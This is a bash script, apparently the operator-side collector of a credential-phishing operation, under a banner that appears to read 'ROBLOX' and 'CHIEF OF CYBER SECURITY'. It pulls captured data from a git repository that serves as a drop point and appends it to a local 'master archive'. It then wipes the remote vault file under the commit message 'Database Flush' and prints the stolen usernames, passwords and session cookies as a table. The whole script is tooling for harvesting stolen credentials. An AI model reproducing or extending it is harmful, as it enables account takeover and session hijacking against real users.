#!/bin/bash
RED='\033[0;31m'
NC='\033[0m'
clear
echo -e "${RED}"
echo "██████╗  ██████╗ ██████╗ ██╗      ██████╗ ██╗  ██╗"
echo "██╔══██╗██╔═══██╗██╔══██╗██║     ██╔═══██╗╚██╗██╔╝"
echo "██████╔╝██║   ██║██████╔╝██║     ██║   ██║ ╚███╔╝ "
echo "██╔══██╗██║   ██║██╔══██╗██║     ██║   ██║ ██╔██╗ "
echo "██║  ██║╚██████╔╝██████╔╝███████╗╚██████╔╝██╔╝ ██╗"
echo "╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝"
echo "             CHIEF OF CYBER SECURITY             "
echo -e "${NC}"
echo -e "${RED}[*] Syncing Cloud Signals...${NC}"
git pull origin main --quiet
touch master_archive.txt
if [ -s "vault.txt" ]; then
    cat vault.txt >> master_archive.txt
    echo -n "" > vault.txt
    git add vault.txt
    git commit -m "Database Flush" --quiet
    git push origin main --quiet
    echo -e "${RED}[+] New Signals Captured!${NC}"
fi
echo -e "${RED}==============================================================${NC}"
echo -e "${RED}      OFFLINE MASTER ARCHIVE (USER | PASS | COOKIE)           ${NC}"
echo -e "${RED}==============================================================${NC}"
printf "${RED}%-15s | %-12s | %-12s | %-s${NC}\n" "TIME" "USER" "PASS" "COOKIE"
echo -e "${RED}--------------------------------------------------------------${NC}"
column -t -s "|" master_archive.txt
